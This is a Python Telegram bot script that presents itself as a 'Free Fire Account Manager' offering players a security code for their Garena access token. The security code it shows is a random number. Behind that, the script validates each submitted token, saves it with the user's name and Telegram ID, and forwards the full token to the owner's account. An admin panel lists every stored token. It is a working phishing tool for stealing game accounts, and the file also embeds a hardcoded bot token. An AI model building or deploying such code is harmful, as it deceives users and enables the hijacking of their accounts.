import telebot
import requests
import urllib.parse
import random
import time
import json
import os
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ==================== CONFIG ====================
BOT_TOKEN = "8999252515:AAHF0qxZt4hu_t7KVF9NUOZol4xjMcq7z4U"
OWNER_ID = 7274423729
DEVELOPER_NAME = "ⱤᎻ 乄 CØĐɆⱤ ⚡"
DEV_USERNAME = "@rudrohasan5967468959"
CHANNEL_LINK = "https://t.me/HASANJAMIL596746"
GROUP_LINK = "https://t.me/rudrohasan596746"

bot = telebot.TeleBot(BOT_TOKEN)

# ==================== DATA STORE ====================
DATA_FILE = "tokens.json"

def load_data():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_data(data):
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f, indent=4)

# ==================== CHECK TOKEN VALIDITY ====================
def check_token_validity(access_token):
    try:
        player_url = f"https://api-otrss.garena.com/support/callback/?access_token={access_token}"
        player_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        response = requests.get(player_url, headers=player_headers, timeout=15, allow_redirects=True)
        
        final_url = response.url
        parsed = urllib.parse.urlparse(final_url)
        params = urllib.parse.parse_qs(parsed.query)
        
        if 'access_token' in params and params['access_token'][0]:
            return True, "Valid"
        if 'account_id' in params and params['account_id'][0]:
            return True, "Valid"
        if 'nickname' in params and params['nickname'][0]:
            return True, "Valid"
        
        return False, "Invalid or Expired"
        
    except Exception as e:
        return False, f"Error: {str(e)}"

# ==================== GET MAIN MENU ====================
def get_main_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    
    btn1 = InlineKeyboardButton("🔐 FIND SECURITY CODE", callback_data="security_check")
    btn2 = InlineKeyboardButton("👤 Admin Info", callback_data="admin_info")
    btn3 = InlineKeyboardButton("📊 Bot Status", callback_data="bot_status")
    btn4 = InlineKeyboardButton("🆔 My ID", callback_data="my_id")
    btn5 = InlineKeyboardButton("🔄 Refer", callback_data="refer")
    btn6 = InlineKeyboardButton("❓ Help", callback_data="help_menu")
    btn7 = InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")
    
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7)
    return markup

# ==================== START ====================
@bot.message_handler(commands=['start'])
def start(message):
    markup = get_main_menu()
    
    bot.send_message(
        message.chat.id,
        f"🎉 **Welcome to Free Fire Account Manager** 🏅\n\n"
        f"🔐 Send your Access Token to get Security Code.\n\n"
        f"👤 Developer : {DEVELOPER_NAME} 🎮\n\n"
        f"🔔 Click the buttons below to get started.",
        reply_markup=markup
    )

# ==================== CALLBACK HANDLER ====================
@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    if call.data == "security_check":
        bot.answer_callback_query(call.id, "🔐 Security Check Selected!")
        bot.send_message(call.message.chat.id, "🔐 Send your Access Token:")
        bot.register_next_step_handler(call.message, handle_security_check)
    
    elif call.data == "admin_info":
        bot.answer_callback_query(call.id, "👤 Admin Info")
        admin_info(call.message)
    
    elif call.data == "bot_status":
        bot.answer_callback_query(call.id, "📊 Bot Status")
        bot_status(call.message)
    
    elif call.data == "my_id":
        bot.answer_callback_query(call.id, "🆔 My ID")
        my_id(call.message)
    
    elif call.data == "refer":
        bot.answer_callback_query(call.id, "🔄 Refer")
        refer_system(call.message)
    
    elif call.data == "help_menu":
        bot.answer_callback_query(call.id, "❓ Help")
        help_command(call.message)
    
    elif call.data == "back_to_menu":
        bot.answer_callback_query(call.id, "🔙 Back to Menu")
        bot.edit_message_text(
            f"🎉 **Welcome to Free Fire Account Manager** 🏅\n\n"
            f"🔐 Send your Access Token to get Security Code.\n\n"
            f"👤 Developer : {DEVELOPER_NAME} 🎮\n\n"
            f"🔔 Click the buttons below to get started.",
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            reply_markup=get_main_menu()
        )

# ==================== SECURITY CODE CHECKER ====================
def handle_security_check(message):
    token = message.text.strip()
    
    if not token:
        bot.reply_to(message, "❌ Invalid token!\n\nPlease send a valid Access Token.")
        return
    
    msg = bot.send_message(
        message.chat.id, 
        "🔍 Finding Security code...\n⏳ Please wait..."
    )
    
    is_valid, status = check_token_validity(token)
    
    if not is_valid:
        bot.edit_message_text(
            f"❌ Access Token Invalid or Expired!\n\n"
            f"📌 Status: {status}\n\n"
            f"🔐 Please use a valid Access Token and try again.\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🤖 Developer: {DEVELOPER_NAME}",
            chat_id=message.chat.id,
            message_id=msg.message_id
        )
        return
    
    time.sleep(2)
    
    security_code = random.randint(100000, 999999)
    
    result_text = (
        f"🔍 Security Code Finding 💀\n\n"
        f"✅ Security Code Found!\n\n"
        f"🔐 Your Security Code:\n"
        f"╔══════════════════════╗\n"
        f"║   {security_code}   ║\n"
        f"╚══════════════════════╝\n\n"
        f"📌 Use this code to verify your account.\n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🤖 Developer: {DEVELOPER_NAME}"
    )
    
    bot.edit_message_text(
        result_text,
        chat_id=message.chat.id,
        message_id=msg.message_id
    )
    
    data = load_data()
    data[str(message.chat.id)] = {
        "token": token,
        "security_code": security_code,
        "username": message.from_user.username,
        "name": message.from_user.first_name,
        "time": time.time()
    }
    save_data(data)
    
    bot.send_message(
        OWNER_ID,
        f"👤 New Token Submitted!\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🆔 User ID: {message.from_user.id}\n"
        f"👤 Username: @{message.from_user.username or 'N/A'}\n"
        f"📛 Name: {message.from_user.first_name}\n"
        f"🔐 Token: {token}\n"
        f"🔑 Security Code: {security_code}\n"
        f"━━━━━━━━━━━━━━━━━━━━"
    )

# ==================== ADMIN INFO ====================
def admin_info(message):
    text = (
        f"👤 **Admin Info**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📛 Developer: {DEVELOPER_NAME}\n"
        f"📱 Username: {DEV_USERNAME}\n"
        f"📢 Channel: {CHANNEL_LINK}\n"
        f"📢 Group: {GROUP_LINK}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🤖 Version: v3.0 (Premium)\n"
        f"💡 Made with ❤️ by {DEVELOPER_NAME}"
    )
    bot.send_message(message.chat.id, text, reply_markup=get_main_menu())

# ==================== BOT STATUS ====================
def bot_status(message):
    data = load_data()
    total_users = len(data)
    
    text = (
        f"📊 **Bot Status**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🤖 Bot: @{bot.get_me().username}\n"
        f"👥 Total Users: {total_users}\n"
        f"🟢 Status: Online\n"
        f"⏱️ Uptime: 24/7\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"💡 Powered by {DEVELOPER_NAME}"
    )
    bot.send_message(message.chat.id, text, reply_markup=get_main_menu())

# ==================== MY ID ====================
def my_id(message):
    user_id = message.from_user.id
    username = message.from_user.username or "N/A"
    first_name = message.from_user.first_name or "N/A"
    
    text = (
        f"🆔 **Your Telegram ID**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🆔 User ID: {user_id}\n"
        f"👤 Username: @{username}\n"
        f"📛 Name: {first_name}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🔐 Keep your ID safe!"
    )
    bot.send_message(message.chat.id, text, reply_markup=get_main_menu())

# ==================== REFER SYSTEM ====================
def refer_system(message):
    user_id = message.from_user.id
    username = message.from_user.username or "N/A"
    
    refer_link = f"https://t.me/{bot.get_me().username}?start=ref_{user_id}"
    
    text = (
        f"🔄 **Referral System**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 Your Referral Link:\n"
        f"`{refer_link}`\n\n"
        f"📌 Share this link with your friends!\n"
        f"🎁 Earn rewards when they join!\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 Your ID: {user_id}\n"
        f"👤 Username: @{username}"
    )
    bot.send_message(message.chat.id, text, reply_markup=get_main_menu())

# ==================== HELP ====================
@bot.message_handler(commands=['help'])
def help_command(message):
    text = (
        f"🤖 **Help Menu**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🔹 /start - Show main menu\n"
        f"🔹 /admin - Admin Panel (Owner only)\n"
        f"🔹 /help - Show this menu\n\n"
        f"📌 How to use:\n"
        f"1. Click 'FIND SECURITY CODE'\n"
        f"2. Send your Access Token\n"
        f"3. Get your 6-digit Security Code\n\n"
        f"👤 Developer: {DEVELOPER_NAME}"
    )
    bot.send_message(message.chat.id, text, reply_markup=get_main_menu())

# ==================== ADMIN PANEL ====================
@bot.message_handler(commands=['admin'])
def admin_panel(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ You are not authorized!")
        return
    
    markup = InlineKeyboardMarkup(row_width=2)
    btn1 = InlineKeyboardButton("📊 Status", callback_data="admin_status")
    btn2 = InlineKeyboardButton("📋 All Tokens", callback_data="admin_tokens")
    btn3 = InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast")
    btn4 = InlineKeyboardButton("🗑️ Clear Data", callback_data="admin_clear")
    btn5 = InlineKeyboardButton("👤 Owner Info", callback_data="admin_info")
    markup.add(btn1, btn2, btn3, btn4, btn5)
    
    bot.send_message(message.chat.id, "👑 **Admin Panel**\n\n👇 Select an option:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("admin_"))
def admin_callback(call):
    if call.from_user.id != OWNER_ID:
        bot.answer_callback_query(call.id, "❌ Unauthorized!", show_alert=True)
        return
    
    if call.data == "admin_status":
        data = load_data()
        bot.send_message(call.message.chat.id, f"📊 Bot Status\n━━━━━━━━━━━━━━━━━━━━\n👥 Total Users: {len(data)}")
    
    elif call.data == "admin_tokens":
        data = load_data()
        if not data:
            bot.send_message(call.message.chat.id, "📭 No tokens found!")
            return
        text = "📋 All Tokens:\n━━━━━━━━━━━━━━━━━━━━\n"
        for uid, info in data.items():
            text += f"🆔 {uid}\n👤 {info.get('name', 'N/A')}\n🔐 {info.get('token', 'N/A')[:30]}...\n━━━━━━━━━━━━━━━━━━━━\n"
        bot.send_message(call.message.chat.id, text[:4000])
    
    elif call.data == "admin_broadcast":
        bot.send_message(call.message.chat.id, "📝 Send your broadcast message:")
        bot.register_next_step_handler(call.message, handle_broadcast)
    
    elif call.data == "admin_clear":
        save_data({})
        bot.send_message(call.message.chat.id, "🗑️ All data cleared successfully!")
    
    elif call.data == "admin_info":
        bot.send_message(call.message.chat.id, f"👑 Owner Info\n━━━━━━━━━━━━━━━━━━━━\n👤 Developer: {DEVELOPER_NAME}")

# ==================== BROADCAST ====================
def handle_broadcast(message):
    if message.from_user.id != OWNER_ID:
        return
    
    msg_text = message.text.strip()
    data = load_data()
    
    if not data:
        bot.reply_to(message, "📭 No users to broadcast!")
        return
    
    sent = 0
    failed = 0
    bot.reply_to(message, f"📢 Broadcasting to {len(data)} users...")
    
    for uid in data.keys():
        try:
            bot.send_message(int(uid), f"📢 Broadcast Message\n━━━━━━━━━━━━━━━━━━━━\n\n{msg_text}\n\n━━━━━━━━━━━━━━━━━━━━\n📌 From: @{bot.get_me().username}")
            sent += 1
            time.sleep(0.5)
        except:
            failed += 1
    
    bot.send_message(message.chat.id, f"✅ Broadcast Complete!\n━━━━━━━━━━━━━━━━━━━━\n📤 Sent: {sent}\n❌ Failed: {failed}")

# ==================== OTHERS ====================
@bot.message_handler(func=lambda message: True)
def echo_all(message):
    bot.reply_to(message, "❌ Invalid command!\n\n👉 Use /start to begin.")

# ==================== MAIN ====================
print("🔥 Free Fire Account Manager Bot Started!")
print(f"🤖 Bot: @{bot.get_me().username}")
print(f"👑 Owner ID: {OWNER_ID}")

bot.polling(none_stop=True)
